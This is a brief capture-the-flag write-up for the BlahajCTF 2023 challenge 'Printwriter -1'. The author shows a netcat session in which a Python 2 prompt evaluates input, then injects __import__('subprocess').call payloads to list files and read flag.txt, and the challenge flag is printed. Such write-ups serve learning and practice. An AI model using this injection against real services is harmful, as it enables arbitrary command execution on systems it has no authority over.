---
title: Printwriter -1
date: 2023-12-05
tags:
- misc
categories: BlahajCTF 2023
---

> I'm not very good at C, so I coded this challenge in Python. Don't have Python 3 yet though, so I used Python 2... At least it can't be pwned!

I first noticed that there is some template injection (? because like we aren't using any templates here, idk what to call it):


{% ccb html:true terminal:true %}
<DIV><SPAN STYLE="color:#98C379;">┌──(</SPAN><SPAN STYLE="color:#61AFEF;">suwandi㉿ryan</SPAN><SPAN STYLE="color:#98C379;">)-[</SPAN>~/ctf/blahaj<SPAN STYLE="color:#98C379;">]
└─</SPAN><SPAN STYLE="color:#61AFEF;">$</SPAN> nc 188.166.197.31 30007
Print what? rwandi
How many times? 2*2
rwandi
rwandi
rwandi
rwandi</DIV>
{% endccb %}

So we can get shell:

{% ccb html:true terminal:true %}
<DIV><SPAN STYLE="color:#98C379;">┌──(</SPAN><SPAN STYLE="color:#61AFEF;">suwandi㉿ryan</SPAN><SPAN STYLE="color:#98C379;">)-[</SPAN>~/ctf/nightmare/Stack_Buffer_Overflow<SPAN STYLE="color:#98C379;">]
└─</SPAN><SPAN STYLE="color:#61AFEF;">$</SPAN> nc 188.166.197.31 30007
Print what? rwandi
How many times? __import__("subprocess").call(["ls","-l"])
total 8
-rw-r--r-- 1 root root  45 Dec  2 06:54 flag.txt
-rwxr-xr-x 1 root root 267 Dec  2 06:54 run
Print what? rwandi
How many times? __import__("subprocess").call(["cat","flag.txt"])
blahaj{0uT_w17h_th3_N3W_4Nd_1N_w1tH_the_Old}</DIV>
{% endccb %}